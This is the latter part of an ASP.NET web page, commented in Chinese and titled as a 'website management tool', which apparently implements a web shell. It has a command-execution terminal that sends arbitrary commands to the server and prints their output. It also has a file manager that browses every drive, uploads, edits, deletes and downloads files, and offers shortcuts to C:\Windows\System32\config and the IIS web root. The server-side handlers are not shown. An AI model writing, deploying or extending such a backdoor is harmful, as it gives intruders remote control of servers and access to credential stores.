            var imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.svg', '.ico'];
            var ext = filePath.substring(filePath.lastIndexOf('.')).toLowerCase();
            return imageExtensions.indexOf(ext) > -1;
        }

        // 判断文件是否可直接下载
        function isDownloadableFile(filePath) {
            // 这里可以定义一些特殊文件类型，比如可执行文件等
            var downloadableExtensions = ['.exe', '.msi', '.zip', '.rar', '.7z', '.iso'];
            var ext = filePath.substring(filePath.lastIndexOf('.')).toLowerCase();
            return downloadableExtensions.indexOf(ext) > -1;
        }

        // 预览图片
        function previewImage(imagePath) {
            // 创建图片预览模态框
            var previewModal = document.getElementById("imagePreviewModal");
            if (!previewModal) {
                previewModal = document.createElement("div");
                previewModal.id = "imagePreviewModal";
                previewModal.className = "edit-box";
                previewModal.innerHTML = `
                    <h3>图片预览: ${imagePath.split('/').pop().split('\\').pop()}</h3>
                    <div style="text-align: center; margin: 10px 0;">
                        <img id="previewImage" src="" style="max-width: 100%; max-height: 400px;" />
                    </div>
                    <div class="edit-buttons">
                        <button onclick="closeImagePreview()">关闭</button>
                        <button onclick="downloadFile('${imagePath}')">下载</button>
                    </div>
                `;
                document.body.appendChild(previewModal);
            }
            
            // 设置图片路径并显示
            document.getElementById("previewImage").src = "data:image/png;base64," + btoa("加载中..."); // 临时占位
            previewModal.style.display = "block";
            
            // 实际应用中，这里需要通过后端获取图片内容
            // 由于安全限制，我们无法直接显示本地文件，所以这里使用一个提示
            alert("图片预览功能需要后端支持才能直接显示图片内容。\n\n文件路径: " + imagePath);
            closeImagePreview();
        }

        // 关闭图片预览
        function closeImagePreview() {
            var previewModal = document.getElementById("imagePreviewModal");
            if (previewModal) {
                previewModal.style.display = "none";
            }
        }

        // 修改下载函数，添加提示
        function downloadFile(filePath) {
            if (!filePath) {
                alert("请先选择要下载的文件");
                return;
            }
            
            // 检查是否是目录
            var isDirectory = currentRow ? currentRow.getAttribute("data-is-directory") === "true" : false;
            
            if (isDirectory) {
                alert("目录不支持下载，请选择文件");
                return;
            }
            
            var fileName = filePath.split('/').pop().split('\\').pop();
            showDownloadNotification(fileName);
            
            // 创建隐藏的表单进行下载
            var form = document.createElement("form");
            form.method = "POST";
            form.action = window.location.href;
            form.style.display = "none";
            
            var actionInput = document.createElement("input");
            actionInput.name = "action";
            actionInput.value = "download";
            form.appendChild(actionInput);
            
            var filePathInput = document.createElement("input");
            filePathInput.name = "filePath";
            filePathInput.value = filePath;
            form.appendChild(filePathInput);
            
            document.body.appendChild(form);
            form.submit();
            document.body.removeChild(form);
            
            hideContextMenu();
        }



        // 打开文件查看对话框（用于只读查看）
        function openViewDialog(filePath) {
            currentFilePath = filePath;
            
            // 显示加载中提示
            document.getElementById("editTitle").innerText = "查看文件: " + filePath;
            document.getElementById("editContent").value = "加载中...";
            document.getElementById("editContent").readOnly = true; // 设置为只读
            document.getElementById("editBox").style.display = "block";
            
            // 通过 AJAX 加载文件内容
            var formData = new FormData();
            formData.append("action", "readfile");
            formData.append("filePath", filePath);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if(xhr.status === 200) {
                    var content = xhr.responseText;
                    if(content === "FILE_NOT_FOUND") {
                        alert("文件不存在");
                        closeEditDialog();
                    } else if(content.startsWith("READ_ERROR")) {
                        alert("读取文件失败: " + content);
                        closeEditDialog();
                    } else {
                        document.getElementById("editContent").value = content;
                    }
                } else {
                    alert("请求失败，状态码: " + xhr.status);
                    closeEditDialog();
                }
            };
            xhr.send(formData);
        }

        // 左击选中行时改变背景色
        function selectRow(row) {
            if(currentRow){
                currentRow.classList.remove("selected");
            }
            currentRow = row;
            row.classList.add("selected");
        }

        
        // 双击处理：目录则导航，文件则判断是否可编辑
        function rowDoubleClick(e, row) {
            var path = row.getAttribute("data-path");
            var isDirectory = row.getAttribute("data-is-directory");
            if(isDirectory === "true"){
                // 目录：导航
                document.getElementById("pathInput").value = path;
                document.getElementById("fileForm").submit();
            } else {
                // 文件：判断是否可编辑
                if(isEditableFile(path)) {
                    openEditDialog(path);
                } else {
                    alert("此文件类型不支持编辑");
                }
            }
        }

        
        
        // 打开编辑对话框（修改以支持新建模式）
        function openEditDialog(path) {
            currentFilePath = path;
            
            // 显示加载中提示
            document.getElementById("editTitle").innerText = "编辑文件: " + path.split('\\').pop();
            document.getElementById("editContent").value = "加载中...";
            document.getElementById("editContent").readOnly = false;
            
            // 设置保存按钮
            document.getElementById("saveButton").style.display = "inline-block";
            document.getElementById("saveButton").onclick = saveEdit;
            var createButton = document.getElementById("createButton");
            if (createButton) {
                createButton.style.display = "none";
            }
            
            document.getElementById("editBox").style.display = "block";
            
            // 通过 AJAX 加载文件内容
            var formData = new FormData();
            formData.append("action", "readfile");
            formData.append("filePath", path);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if(xhr.status === 200) {
                    var content = xhr.responseText;
                    if(content === "FILE_NOT_FOUND") {
                        alert("文件不存在");
                        closeEditDialog();
                    } else if(content.startsWith("READ_ERROR")) {
                        alert("读取文件失败: " + content);
                        closeEditDialog();
                    } else {
                        document.getElementById("editContent").value = content;
                    }
                } else {
                    alert("请求失败，状态码: " + xhr.status);
                    closeEditDialog();
                }
            };
            xhr.send(formData);
        }
        
        // 保存编辑内容
        function saveEdit() {
            var content = document.getElementById("editContent").value;
            
            var formData = new FormData();
            formData.append("action", "savefile");
            formData.append("filePath", currentFilePath);
            formData.append("content", content);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if(xhr.status === 200) {
                    var response = xhr.responseText;
                    if(response === "SAVE_SUCCESS") {
                        alert("保存成功！");
                        closeEditDialog();
                    } else if(response.startsWith("SAVE_ERROR")) {
                        alert("保存失败: " + response);
                    } else {
                        alert("未知响应: " + response);
                    }
                } else {
                    alert("请求失败，状态码: " + xhr.status);
                }
            };
            xhr.send(formData);
        }

        // 关闭编辑对话框
        function closeEditDialog() {
            document.getElementById("editBox").style.display = "none";
            // 重置按钮状态
            document.getElementById("saveButton").style.display = "inline-block";
            document.getElementById("saveButton").onclick = saveEdit;
            var createButton = document.getElementById("createButton");
            if (createButton) {
                createButton.style.display = "none";
            }
        }

        // 右键菜单事件处理
        function rowOnContextMenu(e, row) {
            e.preventDefault();
            // 同时选中行
            selectRow(row);
            currentFilePath = row.getAttribute("data-path");
            
            // 更新菜单项文本
            var isDirectory = row.getAttribute("data-is-directory") === "true";
            var renameItem = document.querySelector('.context-menu li[onclick="contextRename()"]');
            var compressItem = document.querySelector('.context-menu li[onclick="contextCompress()"]');
            
            if (renameItem) {
                renameItem.textContent = "重命名 " + (isDirectory ? "目录" : "文件");
            }
            
            if (compressItem) {
                if (isDirectory) {
                    compressItem.textContent = "压缩目录";
                    compressItem.style.display = "block";
                } else {
                    compressItem.textContent = "压缩目录";
                    compressItem.style.display = "block";
                    // 或者可以选择隐藏压缩选项：compressItem.style.display = "none";
                }
            }
            
            // 显示右键菜单
            contextMenu.style.display = "block";
            contextMenu.style.left = e.pageX + "px";
            contextMenu.style.top = e.pageY + "px";
        }

        // 隐藏右键菜单
        function hideContextMenu() {
            if(contextMenu) {
                contextMenu.style.display = "none";
            }
        }

        // 以下为右键菜单各操作（均为示例，实际逻辑需与后端交互）
        function contextRefresh() {
			// 隐藏右键菜单
			hideContextMenu();
			// 重新提交表单以刷新当前目录
			document.getElementById("fileForm").submit();
		}


        //打开按钮
        function contextOpen() {
            if (!currentFilePath) {
                alert("请先选择文件或目录");
                hideContextMenu();
                return;
            }

            // 检查是否是目录
            var isDirectory = currentRow.getAttribute("data-is-directory") === "true";
            
            if (isDirectory) {
                // 目录：进入该目录
                document.getElementById("pathInput").value = currentFilePath;
                document.getElementById("fileForm").submit();
            } else {
                // 文件：根据文件类型处理
                if (isEditableFile(currentFilePath)) {
                    // 可编辑文件：打开编辑对话框
                    openEditDialog(currentFilePath);
                } else if (isViewableFile(currentFilePath)) {
                    // 可查看文件：尝试查看内容
                    openViewDialog(currentFilePath);
                } else if (isImageFile(currentFilePath)) {
                    // 图片文件：预览图片
                    previewImage(currentFilePath);
                } else {
                    // 其他文件类型：提示不支持
                    alert("此文件类型不支持直接打开，请使用其他方式查看。");
                }
            }
            hideContextMenu();
        }


        // 批量下载选中的文件
        function downloadSelectedFiles() {
            var selectedRows = document.querySelectorAll('.selected');
            if (selectedRows.length === 0) {
                alert("请先选择要下载的文件");
                return;
            }
            
            var filePaths = [];
            for (var i = 0; i < selectedRows.length; i++) {
                var row = selectedRows[i];
                var isDirectory = row.getAttribute("data-is-directory") === "true";
                if (!isDirectory) {
                    filePaths.push(row.getAttribute("data-path"));
                }
            }
            
            if (filePaths.length === 0) {
                alert("选中的项目中没有文件（只有目录）");
                return;
            }
            
            if (filePaths.length === 1) {
                // 单个文件直接下载
                downloadFile(filePaths[0]);
            } else {
                // 多个文件需要逐个下载（浏览器限制，无法批量下载）
                alert("由于浏览器限制，每次只能下载一个文件。\n\n将开始逐个下载选中的 " + filePaths.length + " 个文件。");
                
                // 逐个下载文件
                downloadFilesSequentially(filePaths, 0);
            }
        }

        // 逐个下载文件
        function downloadFilesSequentially(filePaths, index) {
            if (index >= filePaths.length) {
                return;
            }
            
            // 延迟下载，避免浏览器阻止
            setTimeout(function() {
                downloadFile(filePaths[index]);
                
                // 继续下载下一个文件
                if (index + 1 < filePaths.length) {
                    setTimeout(function() {
                        downloadFilesSequentially(filePaths, index + 1);
                    }, 1000); // 1秒间隔
                }
            }, 500);
        }

        // 显示下载提示
        function showDownloadNotification(fileName) {
            // 创建下载提示
            var notification = document.createElement("div");
            notification.id = "downloadNotification";
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: #4CAF50;
                color: white;
                padding: 15px;
                border-radius: 5px;
                z-index: 10000;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            `;
            notification.innerHTML = "开始下载: " + fileName;
            
            document.body.appendChild(notification);
            
            // 3秒后自动消失
            setTimeout(function() {
                if (document.body.contains(notification)) {
                    document.body.removeChild(notification);
                }
            }, 3000);
        }

function contextDelete() {
    if (!currentFilePath) {
        alert("请先选择要删除的文件或目录");
        hideContextMenu();
        return;
    }

    var isDirectory = currentRow.getAttribute("data-is-directory") === "true";
    var itemName = currentFilePath.split('/').pop().split('\\').pop();
    
    var message = isDirectory ? 
        "确认删除目录 \"" + itemName + "\" 吗？\n此操作将删除目录及其所有内容，且不可恢复！" :
        "确认删除文件 \"" + itemName + "\" 吗？\n此操作不可恢复！";
    
    if (confirm(message)) {
        var formData = new FormData();
        formData.append("action", "delete");
        formData.append("currentPath", currentFilePath);

        var xhr = new XMLHttpRequest();
        xhr.open("POST", window.location.href, true);
        xhr.onload = function () {
            if (xhr.status === 200) {
                var response = xhr.responseText.trim();
                if (response === "DELETE_SUCCESS") {
                    showNotification("删除成功！", "success");
                    document.getElementById("fileForm").submit(); // 刷新页面
                } else if (response === "FILE_NOT_FOUND") {
                    alert("文件或目录不存在！");
                } else if (response === "ACCESS_DENIED") {
                    alert("没有权限删除此文件或目录！");
                } else if (response.startsWith("IO_ERROR")) {
                    alert("删除失败：" + response.split(":")[1]);
                } else {
                    alert("删除失败：" + response);
                }
            } else {
                alert("请求失败，请稍后再试。");
            }
        };
        xhr.send(formData);
    }
    hideContextMenu();
}


// 命令执行功能
document.addEventListener('DOMContentLoaded', function() {
    // 确保在命令面板激活时初始化
    const commandPanel = document.getElementById('panelCommand');
    if (commandPanel) {
        initCommandModule();
    }
});

function initCommandModule() {
    const outputContainer = document.getElementById('outputContainer');
    const commandInput = document.getElementById('commandInput');
    const executeBtn = document.getElementById('executeBtn');
    const clearBtn = document.getElementById('clearBtn');
    
    if (!outputContainer || !commandInput) return;
    
    // 执行命令
    function executeCommand() {
        const command = commandInput.value.trim();
        if (!command) return;
        
        // 添加用户输入的命令到输出区域
        addOutputLine(GetCurrentPrompt() + command);
        
        // 发送命令到后端
        sendCommandToServer(command);
        
        // 清空输入框
        commandInput.value = '';
    }
    
    // 添加输出行
    function addOutputLine(text) {
        const line = document.createElement('div');
        line.className = 'output-line';
        line.textContent = text;
        outputContainer.appendChild(line);
        
        // 滚动到底部
        outputContainer.scrollTop = outputContainer.scrollHeight;
    }
    
    // 获取当前提示符
    function GetCurrentPrompt() {
        var promptElement = document.querySelector('.prompt');
        return promptElement ? promptElement.textContent : "C:\\>";
    }
    
    // 发送命令到服务器
    function sendCommandToServer(command) {
        var formData = new FormData();
        formData.append("action", "executecommand");
        formData.append("command", command);
        
        var xhr = new XMLHttpRequest();
        xhr.open("POST", window.location.href, true);
        xhr.onload = function() {
            if (xhr.status === 200) {
                var response = xhr.responseText;
                // 按行分割响应并添加到输出
                var lines = response.split('\n');
                for (var i = 0; i < lines.length; i++) {
                    if (lines[i].trim() !== '') {
                        addOutputLine(lines[i]);
                    }
                }
                
                // 添加新的提示符
                addOutputLine(GetCurrentPrompt());
            } else {
                addOutputLine("命令执行失败，HTTP状态码: " + xhr.status);
                addOutputLine(GetCurrentPrompt());
            }
        };
        
        xhr.onerror = function() {
            addOutputLine("网络错误，命令执行失败");
            addOutputLine(GetCurrentPrompt());
        };
        
        xhr.send(formData);
    }
    
    // 清屏
    function clearScreen() {
        outputContainer.innerHTML = '';
        addOutputLine(GetCurrentPrompt());
    }
    
    // 事件监听
    if (executeBtn) {
        executeBtn.addEventListener('click', executeCommand);
    }
    
    if (clearBtn) {
        clearBtn.addEventListener('click', clearScreen);
    }
    
    if (commandInput) {
        commandInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                executeCommand();
            }
        });
    }
    
    // 窗口控制按钮（可选功能）
    var closeBtn = document.querySelector('#panelCommand .close');
    var minimizeBtn = document.querySelector('#panelCommand .minimize');
    var maximizeBtn = document.querySelector('#panelCommand .maximize');
    
    if (closeBtn) {
        closeBtn.addEventListener('click', function() {
            // 可以添加关闭面板的逻辑
            alert('关闭功能');
        });
    }
    
    if (minimizeBtn) {
        minimizeBtn.addEventListener('click', function() {
            // 可以添加最小化逻辑
            alert('最小化功能');
        });
    }
    
    if (maximizeBtn) {
        maximizeBtn.addEventListener('click', function() {
            // 可以添加最大化逻辑
            alert('最大化功能');
        });
    }
}



        // 右键重命名功能
        function contextRename() {
            if (!currentFilePath) {
                alert("请先选择要重命名的文件或目录");
                hideContextMenu();
                return;
            }

            var oldName = currentFilePath.split('/').pop().split('\\').pop();
            var isDirectory = currentRow.getAttribute("data-is-directory") === "true";
            
            // 创建重命名对话框
            var newName = prompt(
                "重命名 " + (isDirectory ? "目录" : "文件") + "\n\n原名称: " + oldName + "\n请输入新名称:",
                oldName
            );
            
            if (newName && newName !== oldName) {
                performRename(currentFilePath, newName);
            } else if (newName === oldName) {
                alert("新名称与原名称相同，无需修改");
            }
            
            hideContextMenu();
        }

        // 执行重命名操作
        function performRename(filePath, newName) {
            var formData = new FormData();
            formData.append("action", "rename");
            formData.append("currentPath", filePath);
            formData.append("newName", newName);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var responseText = xhr.responseText.trim();
                    handleRenameResponse(responseText, filePath, newName);
                } else {
                    alert("请求失败，请稍后再试。");
                }
            };
            xhr.onerror = function() {
                alert("网络错误，请检查连接。");
            };
            xhr.send(formData);
        }

        // 处理重命名响应
        function handleRenameResponse(response, filePath, newName) {
            switch(response) {
                case "RENAME_SUCCESS":
                    showNotification("重命名成功！", "success");
                    // 刷新当前目录
                    setTimeout(() => {
                        document.getElementById("fileForm").submit();
                    }, 500);
                    break;
                case "SAME_NAME":
                    alert("新名称与原文件名相同！");
                    break;
                case "FILE_NOT_FOUND":
                    alert("文件或目录未找到！");
                    break;
                case "FILE_EXISTS":
                    alert("目标位置已存在同名文件或目录！");
                    break;
                case "INVALID_NAME":
                    alert("文件名包含非法字符！");
                    break;
                case "ACCESS_DENIED":
                    alert("没有权限重命名此文件或目录！");
                    break;
                case "EMPTY_PARAMETERS":
                    alert("文件名不能为空！");
                    break;
                default:
                    if (response.startsWith("IO_ERROR") || response.startsWith("RENAME_FAILED")) {
                        alert("重命名失败：" + response.split(":")[1]);
                    } else {
                        alert("未知错误：" + response);
                    }
            }
        }

        // 显示通知
        function showNotification(message, type) {
            var notification = document.createElement("div");
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${type === "success" ? "#4CAF50" : "#f44336"};
                color: white;
                padding: 15px;
                border-radius: 5px;
                z-index: 10000;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                max-width: 300px;
                transition: all 0.3s ease;
            `;
            notification.innerHTML = message;
            
            document.body.appendChild(notification);
            
            // 3秒后自动消失
            setTimeout(function() {
                notification.style.opacity = "0";
                notification.style.transform = "translateX(100%)";
                setTimeout(function() {
                    if (document.body.contains(notification)) {
                        document.body.removeChild(notification);
                    }
                }, 300);
            }, 3000);
        }



        // 新建文件
        function contextNewFile() {
            var currentPath = document.getElementById("pathInput").value;
            if (!currentPath) {
                alert("无法确定当前目录，请先选择一个有效的目录");
                hideContextMenu();
                return;
            }

            var fileName = prompt("请输入新文件名称:", "newfile.txt");
            if (!fileName) {
                hideContextMenu();
                return;
            }

            // 验证文件名
            if (!isValidFileName(fileName)) {
                alert("文件名包含非法字符！\n不允许的字符: \\ / : * ? \" < > |");
                hideContextMenu();
                return;
            }

            var filePath = currentPath.endsWith("\\") ? currentPath + fileName : currentPath + "\\" + fileName;

            // 检查是否需要输入内容
            var needContent = confirm("是否要为新文件输入初始内容？\n点击\"确定\"输入内容，点击\"取消\"创建空文件。");
            
            if (needContent) {
                // 打开编辑对话框输入内容
                openCreateFileDialog(filePath);
            } else {
                // 直接创建空文件
                createNewFile(filePath, "");
            }
            
            hideContextMenu();
        }

        // 打开新建文件编辑对话框（更新）
        function openCreateFileDialog(filePath) {
            currentFilePath = filePath;
            
            document.getElementById("editTitle").innerText = "新建文件: " + filePath.split('\\').pop();
            document.getElementById("editContent").value = "";
            document.getElementById("editContent").readOnly = false;
            
            // 显示创建按钮，隐藏保存按钮
            document.getElementById("saveButton").style.display = "none";
            var createButton = document.getElementById("createButton");
            if (createButton) {
                createButton.style.display = "inline-block";
                createButton.onclick = function() { saveNewFile(filePath); };
            }
            
            document.getElementById("editBox").style.display = "block";
        }

        // 保存新建的文件
        function saveNewFile(filePath) {
            var content = document.getElementById("editContent").value;
            createNewFile(filePath, content);
        }

        // 执行新建文件操作
        function createNewFile(filePath, content) {
            var formData = new FormData();
            formData.append("action", "createfile");
            formData.append("filePath", filePath);
            formData.append("content", content);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var responseText = xhr.responseText.trim();
                    handleCreateResponse(responseText, "文件");
                } else {
                    alert("请求失败，请稍后再试。");
                }
            };
            xhr.onerror = function() {
                alert("网络错误，请检查连接。");
            };
            xhr.send(formData);
        }
        


        // 新建文件夹
        function contextNewFolder() {
            var currentPath = document.getElementById("pathInput").value;
            if (!currentPath) {
                alert("无法确定当前目录，请先选择一个有效的目录");
                hideContextMenu();
                return;
            }

            var folderName = prompt("请输入新文件夹名称:", "New Folder");
            if (!folderName) {
                hideContextMenu();
                return;
            }

            // 验证文件夹名
            if (!isValidFileName(folderName)) {
                alert("文件夹名包含非法字符！\n不允许的字符: \\ / : * ? \" < > |");
                hideContextMenu();
                return;
            }

            var folderPath = currentPath.endsWith("\\") ? currentPath + folderName : currentPath + "\\" + folderName;
            createNewFolder(folderPath);
            
            hideContextMenu();
        }

        // 执行新建文件夹操作
        function createNewFolder(folderPath) {
            var formData = new FormData();
            formData.append("action", "createfolder");
            formData.append("folderPath", folderPath);

            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var responseText = xhr.responseText.trim();
                    handleCreateResponse(responseText, "文件夹");
                } else {
                    alert("请求失败，请稍后再试。");
                }
            };
            xhr.onerror = function() {
                alert("网络错误，请检查连接。");
            };
            xhr.send(formData);
        }

        // 验证文件名/文件夹名是否合法
        function isValidFileName(name) {
            // Windows 文件系统不允许的字符
            var invalidChars = /[\\/:*?"<>|]/;
            return !invalidChars.test(name) && name.trim() !== "";
        }

        // 处理新建操作的响应
        function handleCreateResponse(response, type) {
            switch(response) {
                case "CREATE_SUCCESS":
                    showNotification(type + "创建成功！", "success");
                    // 刷新当前目录
                    setTimeout(() => {
                        document.getElementById("fileForm").submit();
                    }, 500);
                    break;
                case "FILE_EXISTS":
                case "FOLDER_EXISTS":
                    alert(type + "已存在，请使用其他名称！");
                    break;
                case "INVALID_NAME":
                    alert(type + "名称包含非法字符！\n不允许的字符: \\ / : * ? \" < > |");
                    break;
                case "ACCESS_DENIED":
                    alert("没有权限在此位置创建" + type + "！");
                    break;
                case "EMPTY_PATH":
                    alert("路径不能为空！");
                    break;
                default:
                    if (response.startsWith("IO_ERROR") || response.startsWith("CREATE_FAILED")) {
                        alert(type + "创建失败：" + response.split(":")[1]);
                    } else {
                        alert("未知错误：" + response);
                    }
            }
            
            // 关闭编辑对话框（如果是通过编辑对话框创建的）
            closeEditDialog();
        }        
		
		
		
		function contextUpload() {
			// 触发隐藏的文件选择控件
			document.getElementById("uploadInput").click();
			hideContextMenu();
		}

		// 当用户选择文件后自动调用该函数
		function uploadSelectedFile() {
			var fileInput = document.getElementById("uploadInput");
			var file = fileInput.files[0];
			if(!file) return;
			var formData = new FormData();
			formData.append("upload", "1"); // 标识这是上传请求
			formData.append("uploadFile", file); // 文件数据
			// 将当前目录路径传递给服务器
			formData.append("path", document.getElementById("pathInput").value);
			
			var xhr = new XMLHttpRequest();
			xhr.open("POST", window.location.href, true);
			xhr.onload = function() {
				if(xhr.status === 200 && xhr.responseText.trim() === "UPLOAD_SUCCESS") {
					alert("上传成功！");
					// 上传成功后自动刷新当前目录
					document.getElementById("fileForm").submit();
				} else {
					alert("上传失败：" + xhr.responseText);
				}
			};
			xhr.send(formData);
		}

		window.onload = function() {
			// 初始化右键菜单对象
			contextMenu = document.getElementById("contextMenu");

			// 默认显示文件管理面板
			showPanel('panelFile', document.getElementById('menuFile'));

			// 为隐藏的文件上传控件添加 change 事件监听
			document.getElementById("uploadInput").addEventListener("change", uploadSelectedFile);
		};

		window.onclick = function(e) {
			hideContextMenu();
		};

    </script>
</head>
<body>
    <div class="container">
        <!-- 标题和菜单区域 -->
        <div class="header">
            <div class="title">网站管理工具</div>
            <div class="menu">
                <a id="menuCommand" onclick="showPanel('panelCommand', this)">命令执行</a>
                <a id="menuFile" onclick="showPanel('panelFile', this)">文件管理</a>
                <a id="menuThird" onclick="showPanel('panelThird', this)">菜单三</a>
            </div>
        </div>
        <!-- 文件管理面板 -->
        <div id="panelFile" class="content active">
            <form id="fileForm" method="post" action="">
                <input type="hidden" name="menu" value="file" />
                <div class="file-toolbar">
                    当前路径: <strong><%= currentPath %></strong><br />
                    <input type="text" id="pathInput" name="path" placeholder="输入路径" value="<%= currentPath %>" />
                    <select id="pathSelect" onchange="updatePathInput()">
                        <option value="">选择常用路径</option>
                        <option value="C:\Windows\System32\config">C:\Windows\System32\config</option>
                        <option value="C:\Windows\Temp">C:\Windows\Temp</option>
                        <option value="C:\inetpub\wwwroot">C:\inetpub\wwwroot</option>
                    </select>
                    <button type="submit">跳转</button>
                    <button type="button" onclick="goToParentDirectory()">上层目录</button>
                    <button type="button" onclick="showCurrentPermissions()">查看权限</button>
                </div>
            </form>
            <div class="file-container">
                <!-- 左侧：磁盘列表（独立滚动区域） -->
                <div class="file-sidebar">
                    <h3>磁盘</h3>
                    <% 
                        string[] drives = GetDrives();
                        foreach (string drive in drives)
                        {
                    %>
                    <form method="post" action="">
                        <input type="hidden" name="menu" value="file" />
                        <input type="hidden" name="path" value="<%= drive %>" />
                        <button type="submit"><%= drive %></button>
                    </form>
                    <% } %>
                </div>
                <!-- 右侧：文件目录展示（独立滚动区域） -->
                <div class="file-main">
                    <h2>文件管理器</h2>
                    <table>
                        <tr>
                            <th>名称</th>
                            <th>类型</th>
                            <th>修改时间</th>
                            <th>权限</th>
                        </tr>
                        <%
                            try
                            {
                                if(!string.IsNullOrEmpty(currentPath) && Directory.Exists(currentPath))
                                {
                                    // 遍历目录
                                    foreach (string dir in Directory.GetDirectories(currentPath))
                                    {
                                        string dirName = Path.GetFileName(dir);
                        %>
                        <tr onclick="selectRow(this)" oncontextmenu="rowOnContextMenu(event, this)" ondblclick="rowDoubleClick(event, this)" data-path="<%= dir %>" data-is-directory="true">
                            <td><%= GetIcon(dirName, true) %> <%= dirName %></td>
                            <td>目录</td>
                            <td><%= GetLastModified(dir) %></td>
                            <td><%= GetPermissions(dir) %></td>
                        </tr>
                        <%
                                    }
                                    // 遍历文件
                                    foreach (string file in Directory.GetFiles(currentPath))
                                    {
                                        string fileName = Path.GetFileName(file);
                        %>
                        <tr onclick="selectRow(this)" oncontextmenu="rowOnContextMenu(event, this)" ondblclick="rowDoubleClick(event, this)" data-path="<%= file %>" data-is-directory="false">
                            <td><%= GetIcon(fileName, false) %> <%= fileName %></td>
                            <td>文件</td>
                            <td><%= GetLastModified(file) %></td>
                            <td><%= GetPermissions(file) %></td>
                        </tr>
                        <%
                                    }
                                }
                            }
                            catch(Exception ex)
                            {
                        %>
                        <tr>
                            <td colspan="4" style="color:red;">无法访问此目录: <%= ex.Message %></td>
                        </tr>
                        <%
                            }
                        %>
                    </table>
                </div>
            </div>
        </div>
<!-- 命令执行面板 -->
<div id="panelCommand" class="content">
    <div class="terminal-container">
        <div class="terminal-header">
            <div class="terminal-title">命令提示符</div>
            <div class="terminal-controls">
                <div class="control-btn minimize"></div>
                <div class="control-btn maximize"></div>
                <div class="control-btn close"></div>
            </div>
        </div>
        
        <div class="terminal-body">
            <div class="output-container" id="outputContainer">
                <div class="output-line">网站管理工具 - 命令执行模块</div>
                <div class="output-line">输入命令并按回车执行</div>
                <div class="output-line">&nbsp;</div>
                <div class="output-line"><%= GetCurrentDirectory() %>&gt;</div>
            </div>
            
            <div class="command-line">
                <div class="prompt"><%= GetCurrentDirectory() %>&gt;</div>
                <input type="text" class="command-input" id="commandInput" placeholder="输入命令..." autofocus>
                <button class="btn-execute" id="executeBtn">执行</button>
                <button class="btn-clear" id="clearBtn">清屏</button>
            </div>
        </div>
    </div>
</div>
        <!-- 菜单三面板（待开发） -->
        <div id="panelThird" class="content">
            <h2>菜单三</h2>
            <p>此功能待开发...</p>
        </div>
    </div>
    
    <!-- 在右键菜单中添加批量下载 -->
    <div id="contextMenu" class="context-menu">
        <ul>
            <li onclick="contextRefresh()">刷新</li>
            <li onclick="contextOpen()">打开</li>
            <li onclick="contextUpload()">上传</li>
            <li onclick="contextRename()">重命名</li>
            <li onclick="contextDelete()">删除</li>
            <li onclick="contextCompress()">压缩</li>
            <li onclick="downloadFile(currentFilePath)">下载</li>
            <li onclick="downloadSelectedFiles()">下载选中项</li> <!-- 新增 -->
            <li onclick="contextNewFile()">新建文件</li>
            <li onclick="contextNewFolder()">新建文件夹</li>
        </ul>
    </div>
    <!-- 编辑框，用于文件编辑和新建文件 -->
    <div id="editBox" class="edit-box">
        <h3 id="editTitle">编辑文件</h3>
        <textarea id="editContent"></textarea>
        <div class="edit-buttons">
            <button id="saveButton" onclick="saveEdit()">保存</button>
            <button id="createButton" style="display:none;" onclick="saveNewFile(currentFilePath)">创建</button>
            <button onclick="closeEditDialog()">取消</button>
        </div>
    </div>
	<!-- 隐藏的文件上传控件 -->
	<input type="file" id="uploadInput" style="display:none;" />

	
    <!-- 原有的辅助函数（例如更新路径、上层目录导航） -->
    <script>
        function updatePathInput() {
            var select = document.getElementById("pathSelect");
            var input = document.getElementById("pathInput");
            if (select.value) {
                input.value = select.value;
            }
        }
        function goToParentDirectory() {
            var pathInput = document.getElementById("pathInput");
            var currentPath = pathInput.value;
            currentPath = currentPath.replace(/\\+$/, "");
            if (currentPath.length === 2) {
                alert("已经到达根目录，无法上移！");
                return;
            }
            var lastSlashIndex = currentPath.lastIndexOf("\\");
            var parentPath = currentPath.substring(0, lastSlashIndex);
            if (parentPath.length === 2) {
                parentPath = parentPath + "\\";
            }
            pathInput.value = parentPath;
            document.getElementById("fileForm").submit();
        }
        // 原有的 showPanel 函数保持不变
        function showPanel(panelId, element) {
            var links = document.querySelectorAll('.menu a');
            links.forEach(function(link) {
                link.classList.remove('active');
            });
            element.classList.add('active');
            var panels = document.querySelectorAll('.content');
            panels.forEach(function(panel) {
                panel.classList.remove('active');
            });
            document.getElementById(panelId).classList.add('active');
        }

        // 显示当前权限信息
function showCurrentPermissions() {
    var formData = new FormData();
    formData.append("action", "getpermissions");
    
    var xhr = new XMLHttpRequest();
    xhr.open("POST", window.location.href, true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            // 在编辑框中显示权限信息
            document.getElementById("editTitle").innerText = "当前权限信息";
            document.getElementById("editContent").value = xhr.responseText;
            document.getElementById("editContent").readOnly = true;
            
            // 隐藏保存按钮，显示关闭按钮
            document.getElementById("saveButton").style.display = "none";
            var createButton = document.getElementById("createButton");
            if (createButton) {
                createButton.style.display = "none";
            }
            
            document.getElementById("editBox").style.display = "block";
        }
    };
    xhr.send(formData);
}
    </script>
</body>
</html>